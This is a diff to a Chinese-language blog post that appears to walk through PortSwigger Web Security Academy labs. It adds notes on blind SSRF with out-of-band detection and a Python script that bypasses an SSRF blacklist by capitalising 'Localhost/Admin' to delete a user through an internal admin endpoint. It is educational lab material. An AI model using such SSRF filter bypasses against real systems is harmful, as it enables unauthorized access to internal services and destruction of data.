@@ -96,6 +96,22 @@ export default function Post() {
                 `}
             />
             <X.P>`192.168.0.13:8080/admin`返回`200`。删除用户同上。</X.P>
+            <X.H2>Pr: Blind SSRF with out-of-band detection</X.H2>
+            <X.P>根据提示，重放请求，把`Referer`改为Burp Collaborator生成的地址，发送即可。</X.P>
+            <X.H2>Pr: SSRF with blacklist-based input filter</X.H2>
+            <X.P>官方题解用的是双重URL编码，这里发现大写也能绕过。</X.P>
+            <X.CodeBlock
+                language="python"
+                highlightLines="4"
+                code={`
+                import requests
+
+                url = "https://0aab002a034b510483b51fab001200c3.web-security-academy.net/product/stock"
+                stockApi = f"http://Localhost/Admin/delete?username=carlos"
+                resp = requests.post(url, data={"stockApi": stockApi})
+                print(resp.text)
+                `}
+            />
             <X.H1>OS command injection</X.H1>
             <X.H2>Ap: OS command injection, simple case</X.H2>
             <X.P>提示了网站会用参数直接执行shell脚本，所以：</X.P>
